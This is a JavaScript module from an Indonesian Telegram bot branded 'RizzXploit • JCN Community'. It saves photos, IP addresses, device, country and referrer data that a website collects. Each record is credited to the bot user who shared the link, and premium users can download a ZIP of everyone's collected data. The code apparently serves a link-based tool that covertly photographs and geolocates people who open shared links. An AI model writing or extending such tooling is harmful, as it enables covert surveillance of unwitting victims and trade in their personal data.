const db = require('../database/db');
const zipGenerator = require('../utils/zip-generator');
const moment = require('moment');

class DataHandler {
  
  // View personal data
  async viewPersonalData(chatId) {
    try {
      const userData = await db.query(
        'SELECT * FROM data WHERE user_id = ? ORDER BY timestamp DESC LIMIT 10',
        [chatId.toString()]
      );

      if (userData.length === 0) {
        global.bot.sendMessage(chatId,
          `📭 Belum ada data yang terkumpul dari Anda.\n\n🔧 *Bot by RizzXploit • JCN Community*`,
          { parse_mode: 'Markdown' }
        );
        return;
      }

      let dataText = `👀 **DATA PRIBADI ANDA**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
      
      userData.forEach((data, index) => {
        dataText += `**${index + 1}. Data ${moment(data.timestamp).format('DD/MM/YY HH:mm')}**\n`;
        dataText += `📍 IP: \`${data.ip_address}\`\n`;
        dataText += `📱 Device: ${data.device_type}\n`;
        dataText += `🌍 Country: ${data.country}\n`;
        dataText += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
      });

      // Get total data count
      const [totalData] = await db.query(
        'SELECT COUNT(*) as count FROM data WHERE user_id = ?',
        [chatId.toString()]
      );

      dataText += `📊 Total data Anda: ${totalData[0].count}\n`;
      dataText += `🔧 *Bot by RizzXploit • JCN Community*`;

      global.bot.sendMessage(chatId, dataText, { parse_mode: 'Markdown' });

    } catch (error) {
      console.error('Error viewing personal data:', error);
      global.bot.sendMessage(chatId,
        `❌ Gagal mengambil data: ${error.message}\n\n🔧 *Bot by RizzXploit • JCN Community*`,
        { parse_mode: 'Markdown' }
      );
    }
  }

  // View premium data (ZIP report)
  async viewPremiumData(chatId) {
    try {
      // Cek apakah user premium
      const [users] = await db.query(
        'SELECT * FROM users WHERE user_id = ?',
        [chatId.toString()]
      );
      
      if (users.length === 0 || users[0].role !== 'premium') {
        global.bot.sendMessage(chatId,
          `❌ Akses ditolak! Hanya user premium yang bisa mengakses fitur ini.\n\n🔧 *Bot by RizzXploit • JCN Community*`,
          { parse_mode: 'Markdown' }
        );
        return;
      }

      global.bot.sendMessage(chatId,
        `📦 Mengumpulkan data dari semua user...\n⏳ Membuat laporan premium...\n\n_Tunggu sebentar..._ 🕐\n\n🔧 *Bot by RizzXploit • JCN Community*`,
        { parse_mode: 'Markdown' }
      );

      // Generate ZIP report
      const zipBuffer = await zipGenerator.generateFullReport();

      if (!zipBuffer) {
        global.bot.sendMessage(chatId,
          `❌ Gagal membuat laporan. Coba lagi nanti.\n\n🔧 *Bot by RizzXploit • JCN Community*`,
          { parse_mode: 'Markdown' }
        );
        return;
      }

      // Kirim file ZIP
      await global.bot.sendDocument(chatId, zipBuffer, {
        caption: `💎 **PREMIUM DATA REPORT**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                 `📁 File: full_data_report_${moment().format('DDMMYY')}.zip\n` +
                 `📊 Berisi semua data terkumpul\n` +
                 `🕒 Generated: ${moment().format('DD/MM/YYYY HH:mm:ss')}\n\n` +
                 `🔧 *Bot by RizzXploit • JCN Community*`,
        parse_mode: 'Markdown'
      });

    } catch (error) {
      console.error('Error generating premium report:', error);
      global.bot.sendMessage(chatId,
        `❌ Gagal membuat laporan premium: ${error.message}\n\n🔧 *Bot by RizzXploit • JCN Community*`,
        { parse_mode: 'Markdown' }
      );
    }
  }

  // Delete data
  async deleteData(chatId, dataId) {
    try {
      const result = await db.query(
        'DELETE FROM data WHERE file_id = ? AND user_id = ?',
        [dataId, chatId.toString()]
      );

      if (result.affectedRows === 0) {
        global.bot.sendMessage(chatId,
          `❌ Data tidak ditemukan atau tidak bisa dihapus.\n\n🔧 *Bot by RizzXploit • JCN Community*`,
          { parse_mode: 'Markdown' }
        );
        return;
      }

      // Update user stats
      await db.query(
        'UPDATE users SET data_collected = data_collected - 1 WHERE user_id = ?',
        [chatId.toString()]
      );

      global.bot.sendMessage(chatId,
        `✅ Data berhasil dihapus!\n\n🔧 *Bot by RizzXploit • JCN Community*`,
        { parse_mode: 'Markdown' }
      );

    } catch (error) {
      console.error('Error deleting data:', error);
      global.bot.sendMessage(chatId,
        `❌ Gagal menghapus data: ${error.message}\n\n🔧 *Bot by RizzXploit • JCN Community*`,
        { parse_mode: 'Markdown' }
      );
    }
  }

  // Show user stats
  async showUserStats(chatId) {
    try {
      const [users] = await db.query(
        'SELECT * FROM users WHERE user_id = ?',
        [chatId.toString()]
      );

      if (users.length === 0) {
        global.bot.sendMessage(chatId,
          `❌ User tidak ditemukan.\n\n🔧 *Bot by RizzXploit • JCN Community*`,
          { parse_mode: 'Markdown' }
        );
        return;
      }

      const user = users[0];
      
      const [dataCountResult] = await db.query(
        'SELECT COUNT(*) as count FROM data WHERE user_id = ?',
        [chatId.toString()]
      );

      const dataCount = dataCountResult[0].count;

      const statsText = `📈 **STATISTIK ANDA**\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
        `👤 Role: ${user.role === 'premium' ? '👑 Premium' : '👤 Member'}\n` +
        `📅 Join Date: ${moment(user.join_date).format('DD/MM/YYYY')}\n` +
        `📊 Data Collected: ${dataCount}\n` +
        `🔗 Links Shared: ${user.links_shared}\n` +
        `🕒 Last Active: ${moment(user.last_active).format('DD/MM/YYYY HH:mm')}\n\n` +
        `🔧 *Bot by RizzXploit • JCN Community*`;

      global.bot.sendMessage(chatId, statsText, { parse_mode: 'Markdown' });

    } catch (error) {
      console.error('Error showing user stats:', error);
      global.bot.sendMessage(chatId,
        `❌ Gagal mengambil statistik: ${error.message}\n\n🔧 *Bot by RizzXploit • JCN Community*`,
        { parse_mode: 'Markdown' }
      );
    }
  }

  // Save new data from website
  async saveData(userId, imageData, clientInfo) {
    try {
      const fileId = `photo_${clientInfo.ip}_${Date.now()}`;
      
      await db.query(
        `INSERT INTO data (file_id, user_id, image_url, ip_address, user_agent, device_type, country, referrer) 
         VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
        [
          fileId, 
          userId, 
          imageData,
          clientInfo.ip,
          clientInfo.userAgent,
          clientInfo.deviceType,
          clientInfo.country || 'Unknown',
          clientInfo.referrer || 'Direct'
        ]
      );

      // Update user stats
      await db.query(
        `UPDATE users SET data_collected = data_collected + 1, last_active = NOW() 
         WHERE user_id = ?`,
        [userId]
      );

      return { success: true, fileId };

    } catch (error) {
      console.error('Error saving data:', error);
      return { success: false, error: error.message };
    }
  }
}

module.exports = new DataHandler();
